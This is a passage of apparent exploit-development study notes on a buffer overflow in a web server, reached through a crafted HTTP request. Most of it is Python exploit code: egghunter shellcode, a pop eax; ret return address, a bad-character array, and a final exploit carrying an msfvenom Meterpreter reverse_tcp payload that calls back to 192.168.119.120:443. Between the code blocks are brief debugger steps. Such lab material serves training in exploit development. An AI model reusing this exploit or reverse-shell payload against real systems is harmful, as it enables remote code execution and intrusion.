    inputBuffer = b"\x41" * (size - len(egghunter))
   
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    shellcode = b"w00tw00t" + b"\x44" * 400

    buf = httpMethod + egghunter + inputBuffer + httpEndRequest + shellcode
...
```
- We attach our debugger to the vulnerable software and set a breakpoint at our POP EAX; RET instruction sequence
- Once our breakpoint is hit, we will execute until a branch is taken (**ph**)
- `u 02f0ea9f L16` where 02f0ea9f is the je address (**this should display the egghunter instruction)
- Breakpoint at `jmp edi` and check if the egg is found (w00tw00tDDDDDDDD) in this case

## Obtaining a Shell
Before doing so, we need to remember that our secondary buffer is stored in a different memory page allocated by the heap and find potential bad chars
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17
    
    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90" # NOP sled
                 b"\x66\x81\xca\xff\x0f\x42\x52\xb8"
                 b"\x44\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c"
                 b"\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74"
                 b"\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7")

    inputBuffer = b"\x41" * (size - len(egghunter))
   
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    badchars = (
        b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
        b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
        b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
        b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
        b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
        b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
        b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
        b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
        b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
        b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
        b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
        b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
        b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
        b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
        b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
        b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
        b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
        b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
        b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    shellcode = b"w00tw00t" + badchars + b"\x44" * (400-len(badchars))

    buf = httpMethod + egghunter + inputBuffer + httpEndRequest + shellcode
...
```
- Let’s place a breakpoint at our POP EAX; RET instruction
- `s -a 0x0 L?80000000 w00tw00t` and check any potential bad chars (none here)
- Final exploit below
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17
    
    # python3 egghunter.py -s -t w00t
    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90" # NOP sled
    # python3 egghunter.py -s -t w00t
                 b"\xeb\x21\x59\xb8\x77\x30\x30\x74"
                 b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
                 b"\x6a\x02\x59\x89\xdf\xf3\xaf\x75"
                 b"\x07\xff\xe7\x66\x81\xcb\xff\x0f"
                 b"\x43\xeb\xed\xe8\xda\xff\xff\xff"
                 b"\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
                 b"\x83\x04\x08\x06\x58\x83\xc4\x10"
                 b"\x50\x31\xc0\xc3")

    inputBuffer = b"\x41" * (size - len(egghunter))
   
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v payload

    payload = b""
    payload += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
    ...
    payload += b"\x6a\x00\x53\xff\xd5"


    shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))

    buf = httpMethod + egghunter + inputBuffer + httpEndRequest + shellcode
...
```